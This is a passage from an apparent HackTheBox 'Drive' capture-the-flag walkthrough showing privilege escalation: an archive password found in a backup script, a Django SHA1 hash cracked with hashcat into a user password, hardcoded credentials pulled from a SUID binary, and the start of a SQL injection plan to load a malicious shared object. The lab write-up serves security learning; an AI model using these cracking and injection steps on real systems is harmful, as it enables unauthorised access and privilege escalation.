</span></span><span class="line"><span class="cl"><span class="nv">date_str</span><span class="o">=</span><span class="k">$(</span>date +<span class="s1">&#39;%d_%b&#39;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">7z a -p<span class="s1">&#39;H@ckThisP@ssW0rDIfY0uC@n:)&#39;</span> /var/www/backups/<span class="si">${</span><span class="nv">date_str</span><span class="si">}</span>_db_backup.sqlite3.7z db.sqlite3
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /var/www/backups/
</span></span><span class="line"><span class="cl">ls -l --sort<span class="o">=</span>t *.7z &gt; backups_num.tmp
</span></span><span class="line"><span class="cl"><span class="nv">backups_num</span><span class="o">=</span><span class="k">$(</span>cat backups_num.tmp <span class="p">|</span> wc -l<span class="k">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> <span class="nv">$backups_num</span> -gt <span class="m">10</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">      <span class="c1">#backups is more than 10... deleting to oldest backup</span>
</span></span><span class="line"><span class="cl">      rm <span class="k">$(</span>ls  *.7z --sort<span class="o">=</span>t --color<span class="o">=</span>never <span class="p">|</span> tail -1<span class="k">)</span>
</span></span><span class="line"><span class="cl">      <span class="c1">#oldest backup deleted successfully!</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl">rm backups_num.tmp
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>H@ckThisP@ssW0rDIfY0uC@n:)</code></p>
<h3 id="abusing-weak-hash-algorithms-to-crack-database-passwords">Abusing weak hash algorithms to crack database passwords</h3>
<p>Before we get too far, it is worth noting the most recent commit on this gitea service:
<code>retruning to the default Djnago hashers due to problems in Bcrypt hashers</code>
When we view the commit changes, we see alterations to <code>geeks_site/settings.py</code>:</p>
<p><img src="/post/hackthebox-drive/Images/gitchanges.png"
	width="1172"
	height="657"
	srcset="/post/hackthebox-drive/Images/gitchanges_hucd8829f7eaed14040c207e11b3a3cabe_88077_480x0_resize_box_3.png 480w, /post/hackthebox-drive/Images/gitchanges_hucd8829f7eaed14040c207e11b3a3cabe_88077_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="178"
		data-flex-basis="428px"
	
></p>
<p>We can see here that this is related to how data in the SQL database is being stored. It seems for some time they were using BCrypt hashes, which is very robust at the expense of processing power. However, it looks like they have recently switched to SHA256. Checking the commit history, we see that at one point they were using SHA1, which is massively easier to crack than SHA256 or Bcrypt:</p>
<p><img src="/post/hackthebox-drive/Images/commithistory.png"
	width="1132"
	height="597"
	srcset="/post/hackthebox-drive/Images/commithistory_hu634d8acccb39281c18e4d481a9754f88_81581_480x0_resize_box_3.png 480w, /post/hackthebox-drive/Images/commithistory_hu634d8acccb39281c18e4d481a9754f88_81581_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="189"
		data-flex-basis="455px"
	
></p>
<p>Now, onto visiting the backup files:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">martin</span><span class="err">@</span><span class="n">drive</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">backups</span><span class="o">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">al</span>
</span></span><span class="line"><span class="cl"><span class="n">total</span> <span class="mi">3740</span>
</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span>    <span class="mi">4096</span> <span class="n">Sep</span>  <span class="mi">1</span> <span class="mi">18</span><span class="p">:</span><span class="mi">23</span> <span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">root</span>     <span class="n">root</span>        <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">15</span> <span class="mi">13</span><span class="p">:</span><span class="mi">34</span> <span class="o">..</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span>   <span class="mi">13018</span> <span class="n">Sep</span>  <span class="mi">1</span> <span class="mi">20</span><span class="p">:</span><span class="mi">00</span> <span class="mi">1</span><span class="n">_Dec_db_backup</span><span class="o">.</span><span class="n">sqlite3</span><span class="o">.</span><span class="mi">7</span><span class="n">z</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span>   <span class="mi">12226</span> <span class="n">Sep</span>  <span class="mi">1</span> <span class="mi">20</span><span class="p">:</span><span class="mi">00</span> <span class="mi">1</span><span class="n">_Nov_db_backup</span><span class="o">.</span><span class="n">sqlite3</span><span class="o">.</span><span class="mi">7</span><span class="n">z</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span>   <span class="mi">12722</span> <span class="n">Sep</span>  <span class="mi">1</span> <span class="mi">20</span><span class="p">:</span><span class="mi">00</span> <span class="mi">1</span><span class="n">_Oct_db_backup</span><span class="o">.</span><span class="n">sqlite3</span><span class="o">.</span><span class="mi">7</span><span class="n">z</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span>   <span class="mi">12770</span> <span class="n">Sep</span>  <span class="mi">1</span> <span class="mi">20</span><span class="p">:</span><span class="mi">00</span> <span class="mi">1</span><span class="n">_Sep_db_backup</span><span class="o">.</span><span class="n">sqlite3</span><span class="o">.</span><span class="mi">7</span><span class="n">z</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>     <span class="mi">3760128</span> <span class="n">Dec</span> <span class="mi">26</span>  <span class="mi">2022</span> <span class="n">db</span><span class="o">.</span><span class="n">sqlite3</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The current <code>db.sqlite3</code> database does not contain any crackable passwords, but we should check the backup tables as well. Although this database is for the web service <code>Doodle Grive</code>, it is possible a user had originally used their system user password before changing.
Here it would be nice to look at gitea&rsquo;s commit timestamps, and we could narrow down which month contains the SHA1 hashes. However, all of the commits are dated on Dec 25th so it is not helpful. Instead, we need to view each backup database and look for the signature <code>sha1$</code> before the salt. Unzipping from 7z requires the previously found password:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Drive]
</span></span><span class="line"><span class="cl">└─$ 7z e 1_Dec_db_backup.sqlite3.7z
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
</span></span><span class="line"><span class="cl">p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-4690K CPU @ 3.50GHz (306C3),ASM,AES-NI)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Scanning the drive for archives:
</span></span><span class="line"><span class="cl">1 file, 13018 bytes (13 KiB)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Extracting archive: 1_Dec_db_backup.sqlite3.7z
</span></span><span class="line"><span class="cl">--
</span></span><span class="line"><span class="cl">Path = 1_Dec_db_backup.sqlite3.7z
</span></span><span class="line"><span class="cl">Type = 7z
</span></span><span class="line"><span class="cl">Physical Size = 13018
</span></span><span class="line"><span class="cl">Headers Size = 170
</span></span><span class="line"><span class="cl">Method = LZMA2:22 7zAES
</span></span><span class="line"><span class="cl">Solid = -
</span></span><span class="line"><span class="cl">Blocks = 1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Enter password (will not be echoed):
</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Size:       3760128
</span></span><span class="line"><span class="cl">Compressed: 13018
</span></span></code></pre></td></tr></table>
</div>
</div><p>December yields the sha256 hashes, which will take forever to crack. However, examining the November backup, we can see SHA1 passwords. Using <code>hashcat</code>, I am able to crack the password associated with user tomHands:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">spencer@MintySJ:~/Desktop$ hashcat -m 124 &#39;sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a&#39; /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule 
</span></span><span class="line"><span class="cl">hashcat (v6.2.5) starting
</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
</span></span><span class="line"><span class="cl">sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a:johnmayer7
</span></span><span class="line"><span class="cl">                                                          
</span></span><span class="line"><span class="cl">Session..........: hashcat
</span></span><span class="line"><span class="cl">Status...........: Cracked
</span></span><span class="line"><span class="cl">Hash.Mode........: 124 (Django (SHA-1))
</span></span><span class="line"><span class="cl">Hash.Target......: sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b252...69525a
</span></span><span class="line"><span class="cl">Time.Started.....: Sun Oct 15 13:22:42 2023 (0 secs)
</span></span><span class="line"><span class="cl">Time.Estimated...: Sun Oct 15 13:22:42 2023 (0 secs)
</span></span><span class="line"><span class="cl">Kernel.Feature...: Pure Kernel
</span></span><span class="line"><span class="cl">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
</span></span><span class="line"><span class="cl">Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
</span></span><span class="line"><span class="cl">Guess.Queue......: 1/1 (100.00%)
</span></span><span class="line"><span class="cl">Speed.#1.........:   567.5 MH/s (10.44ms) @ Accel:256 Loops:38 Thr:64 Vec:1
</span></span><span class="line"><span class="cl">Recovered........: 1/1 (100.00%) Digests
</span></span><span class="line"><span class="cl">Progress.........: 8093696/1104517568 (0.73%)
</span></span><span class="line"><span class="cl">Rejected.........: 0/8093696 (0.00%)
</span></span><span class="line"><span class="cl">Restore.Point....: 0/14344384 (0.00%)
</span></span><span class="line"><span class="cl">Restore.Sub.#1...: Salt:0 Amplifier:0-38 Iteration:0-38
</span></span><span class="line"><span class="cl">Candidate.Engine.: Device Generator
</span></span><span class="line"><span class="cl">Candidates.#1....: 123456 -&gt; sex123
</span></span><span class="line"><span class="cl">Hardware.Mon.#1..: Temp: 58c Fan: 19% Util: 73% Core:1316MHz Mem:3004MHz Bus:16
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Started: Sun Oct 15 13:22:42 2023
</span></span><span class="line"><span class="cl">Stopped: Sun Oct 15 13:22:43 2023
</span></span></code></pre></td></tr></table>
</div>
</div><p>tom cracks into <code>johnmayer7</code>. When checking system user credentials, it is the valid password for <code>tom</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">martin@drive:~$ su tom
</span></span><span class="line"><span class="cl">Password: 
</span></span><span class="line"><span class="cl">tom@drive:/home/martin$ 
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="extracting-stored-credentials-from-compiled-binary">Extracting stored credentials from compiled binary</h3>
<p>Within tom&rsquo;s home folder, we can find a <code>doodlegrive-cli</code> with SUID properties as root:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tom@drive:~$ ls -al
</span></span><span class="line"><span class="cl">total 916
</span></span><span class="line"><span class="cl">drwxr-x--- 6 tom  tom    4096 Sep 13 13:51 .
</span></span><span class="line"><span class="cl">drwxr-xr-x 6 root root   4096 Dec 25  2022 ..
</span></span><span class="line"><span class="cl">lrwxrwxrwx 1 root root      9 Sep  6 02:56 .bash_history -&gt; /dev/null
</span></span><span class="line"><span class="cl">-rw-r--r-- 1 tom  tom     220 Dec 25  2022 .bash_logout
</span></span><span class="line"><span class="cl">-rw-r--r-- 1 tom  tom    3771 Dec 25  2022 .bashrc
</span></span><span class="line"><span class="cl">drwx------ 3 tom  tom    4096 Jan  1  2023 .cache
</span></span><span class="line"><span class="cl">drwx------ 3 tom  tom    4096 Feb  3  2023 .config
</span></span><span class="line"><span class="cl">-rwSr-x--- 1 root tom  887240 Sep 13 13:36 doodleGrive-cli
</span></span><span class="line"><span class="cl">drwx------ 3 tom  tom    4096 Jan  1  2023 .gnupg
</span></span><span class="line"><span class="cl">drwxrwxr-x 3 tom  tom    4096 Dec 28  2022 .local
</span></span><span class="line"><span class="cl">-rw-r--r-- 1 tom  tom     807 Dec 25  2022 .profile
</span></span><span class="line"><span class="cl">-rw-r----- 1 root tom     719 Feb 11  2023 README.txt
</span></span><span class="line"><span class="cl">-rw-r----- 1 root tom      33 Oct 12 11:59 user.txt
</span></span><span class="line"><span class="cl">-rw-r--r-- 1 tom  tom      39 Aug 29 05:59 .vimrc
</span></span></code></pre></td></tr></table>
</div>
</div><p>The README provides details about the item:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Hi</span> <span class="n">team</span>
</span></span><span class="line"><span class="cl"><span class="n">after</span> <span class="n">the</span> <span class="n">great</span> <span class="n">success</span> <span class="n">of</span> <span class="n">DoodleGrive</span><span class="p">,</span> <span class="n">we</span> <span class="n">are</span> <span class="n">planning</span> <span class="n">now</span> <span class="n">to</span> <span class="n">start</span> <span class="n">working</span> <span class="n">on</span> <span class="n">our</span> <span class="n">new</span> <span class="n">project</span><span class="p">:</span> <span class="s2">&#34;DoodleGrive self hosted&#34;</span><span class="p">,</span><span class="n">it</span> <span class="n">will</span> <span class="n">allow</span> <span class="n">our</span> <span class="n">customers</span> <span class="n">to</span> <span class="n">deploy</span> <span class="n">their</span> <span class="n">own</span> <span class="n">documents</span> <span class="n">sharing</span> <span class="n">platform</span> <span class="n">privately</span> <span class="n">on</span> <span class="n">thier</span> <span class="n">servers</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="n">However</span> <span class="ow">in</span> <span class="n">addition</span> <span class="n">with</span> <span class="n">the</span> <span class="s2">&#34;new self Hosted release&#34;</span> <span class="n">there</span> <span class="n">should</span> <span class="n">be</span> <span class="n">a</span> <span class="k">tool</span><span class="p">(</span><span class="n">doodleGrive</span><span class="o">-</span><span class="n">cli</span><span class="p">)</span> <span class="n">to</span> <span class="n">help</span> <span class="n">the</span> <span class="n">IT</span> <span class="n">team</span> <span class="ow">in</span> <span class="n">monitoring</span> <span class="n">server</span> <span class="n">status</span> <span class="ow">and</span> <span class="n">fix</span> <span class="n">errors</span> <span class="n">that</span> <span class="n">may</span> <span class="n">happen</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">As</span> <span class="n">we</span> <span class="n">mentioned</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">last</span> <span class="n">meeting</span> <span class="n">the</span> <span class="k">tool</span> <span class="n">still</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">development</span> <span class="n">phase</span> <span class="ow">and</span> <span class="n">we</span> <span class="n">should</span> <span class="n">test</span> <span class="n">it</span> <span class="n">properly</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="n">We</span> <span class="n">sent</span> <span class="n">the</span> <span class="n">username</span> <span class="ow">and</span> <span class="n">the</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">email</span> <span class="k">for</span> <span class="n">every</span> <span class="n">user</span> <span class="n">to</span> <span class="n">help</span> <span class="n">us</span> <span class="ow">in</span> <span class="n">testing</span> <span class="n">the</span> <span class="k">tool</span> <span class="ow">and</span> <span class="n">make</span> <span class="n">it</span> <span class="n">better</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">If</span> <span class="n">you</span> <span class="n">face</span> <span class="n">any</span> <span class="n">problem</span><span class="p">,</span> <span class="n">please</span> <span class="n">report</span> <span class="n">it</span> <span class="n">to</span> <span class="n">the</span> <span class="n">development</span> <span class="n">team</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">Best</span> <span class="n">regards</span><span class="o">.</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>It mentions credentials, but the email doesn&rsquo;t seem to exist on the box. Fortunately, since this is a binary (and non-stripped!), the user/password check should be baked-in. We can try strings to find this, but with a quick check into vim, I find it very fast by searching for password:
<img src="/post/hackthebox-drive/Images/vim.png"
	width="936"
	height="170"
	srcset="/post/hackthebox-drive/Images/vim_huf2e128184336eb53882424b63cada3ff_48279_480x0_resize_box_3.png 480w, /post/hackthebox-drive/Images/vim_huf2e128184336eb53882424b63cada3ff_48279_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="550"
		data-flex-basis="1321px"
	
>
Using strings, we can splice out string contents. It is a lot, so I still find it best to save it to another file, open and vim and search this way:
<img src="/post/hackthebox-drive/Images/vim2.png"
	width="278"
	height="108"
	srcset="/post/hackthebox-drive/Images/vim2_hue80f9c71973bf63535e164f0f4dd1624_7456_480x0_resize_box_3.png 480w, /post/hackthebox-drive/Images/vim2_hue80f9c71973bf63535e164f0f4dd1624_7456_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="257"
		data-flex-basis="617px"
	
>
here we have creds as <code>moriarty:findMeIfY0uC@nMr.Holmz!</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">tom</span><span class="err">@</span><span class="n">drive</span><span class="p">:</span><span class="o">~$</span> <span class="o">./</span><span class="n">doodleGrive</span><span class="o">-</span><span class="n">cli</span> 
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">!</span><span class="p">]</span><span class="n">Caution</span> <span class="n">this</span> <span class="k">tool</span> <span class="n">still</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">development</span> <span class="n">phase</span><span class="o">...</span><span class="n">please</span> <span class="n">report</span> <span class="n">any</span> <span class="n">issue</span> <span class="n">to</span> <span class="n">the</span> <span class="n">development</span> <span class="n">team</span><span class="p">[</span><span class="o">!</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">Enter</span> <span class="n">Username</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="n">moriarty</span>
</span></span><span class="line"><span class="cl"><span class="n">Enter</span> <span class="n">password</span> <span class="k">for</span> <span class="n">moriarty</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="n">findMeIfY0uC</span><span class="err">@</span><span class="n">nMr</span><span class="o">.</span><span class="n">Holmz</span><span class="o">!</span>
</span></span><span class="line"><span class="cl"><span class="n">Welcome</span><span class="o">...!</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">doodleGrive</span> <span class="n">cli</span> <span class="n">beta</span><span class="o">-</span><span class="mf">2.2</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl"><span class="mf">1.</span> <span class="n">Show</span> <span class="n">users</span> <span class="n">list</span> <span class="ow">and</span> <span class="n">info</span>
</span></span><span class="line"><span class="cl"><span class="mf">2.</span> <span class="n">Show</span> <span class="n">groups</span> <span class="n">list</span>
</span></span><span class="line"><span class="cl"><span class="mf">3.</span> <span class="n">Check</span> <span class="n">server</span> <span class="n">health</span> <span class="ow">and</span> <span class="n">status</span>
</span></span><span class="line"><span class="cl"><span class="mf">4.</span> <span class="n">Show</span> <span class="n">server</span> <span class="n">requests</span> <span class="nb">log</span> <span class="p">(</span><span class="n">last</span> <span class="mi">1000</span> <span class="n">request</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mf">5.</span> <span class="n">activate</span> <span class="n">user</span> <span class="n">account</span>
</span></span><span class="line"><span class="cl"><span class="mf">6.</span> <span class="n">Exit</span>
</span></span><span class="line"><span class="cl"><span class="n">Select</span> <span class="n">option</span><span class="p">:</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><p>It works! Now we have to figure out what to do.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Select option: 1
</span></span><span class="line"><span class="cl">          id = 16
</span></span><span class="line"><span class="cl">  last_login = 2023-02-11 07:46:11.212535
</span></span><span class="line"><span class="cl">is_superuser = 1
</span></span><span class="line"><span class="cl">    username = admin
</span></span><span class="line"><span class="cl">       email = admin@drive.htb
</span></span><span class="line"><span class="cl">    is_staff = 1
</span></span><span class="line"><span class="cl">   is_active = 1
</span></span><span class="line"><span class="cl"> date_joined = 2022-12-08 14:59:02.802351
</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
</span></span><span class="line"><span class="cl">          id = 29
</span></span><span class="line"><span class="cl">  last_login = 2023-10-15 15:58:04.498985
</span></span><span class="line"><span class="cl">is_superuser = 0
</span></span><span class="line"><span class="cl">    username = asdf
</span></span><span class="line"><span class="cl">       email = asdf@asdf.asdf
</span></span><span class="line"><span class="cl">    is_staff = 0
</span></span><span class="line"><span class="cl">   is_active = 1
</span></span><span class="line"><span class="cl"> date_joined = 2023-10-15 15:03:29.237892
</span></span></code></pre></td></tr></table>
</div>
</div><p>It is apparent that the program it is pulling data from the web service. Also within the strings, we might find commands related to the commands.</p>
<h3 id="sql-injection-to-load-a-malicious-shared-object-file">SQL injection to load a malicious shared object file</h3>
<p>For activating a user account, we can find it allows for user input:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sqlite3</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">DoodleGrive</span><span class="o">/</span><span class="n">db</span><span class="o">.</span><span class="n">sqlite3</span> <span class="o">-</span><span class="n">line</span> <span class="s1">&#39;UPDATE accounts_customer SET is_active=1 WHERE username=&#34;</span><span class="si">%s</span><span class="s1">&#34;&#39;</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Injecting SQL to bypass table checking is not helpful for us, but we might <a class="link" href="https://github.com/mpaolino/sqlite-execute-module"  target="_blank" rel="noopener"
    >use SQL injection for remote command execution</a>. However, when checking tricks for this, we quickly find out we are limited in characters. Testing the character limit:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">doodleGrive cli beta-2.2:
</span></span><span class="line"><span class="cl">1. Show users list and info
</span></span><span class="line"><span class="cl">2. Show groups list
</span></span><span class="line"><span class="cl">3. Check server health and status
</span></span><span class="line"><span class="cl">4. Show server requests log (last 1000 request)
</span></span><span class="line"><span class="cl">5. activate user account
</span></span><span class="line"><span class="cl">6. Exit
</span></span><span class="line"><span class="cl">Select option: 5
</span></span><span class="line"><span class="cl">Enter username to activate account: 1234567890123456789012345678901234567890
</span></span><span class="line"><span class="cl">Activating account for user &#39;123456789012345678901234567890123456789&#39;...
</span></span></code></pre></td></tr></table>
</div>
</div><p>When supplying a string of 40 characters, only 39 is returned. We should assume that we can only work with a maximum of 39 characters. Our long UNION SELECT payload is not quite viable anymore. Additionally, several characters are not allowed:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
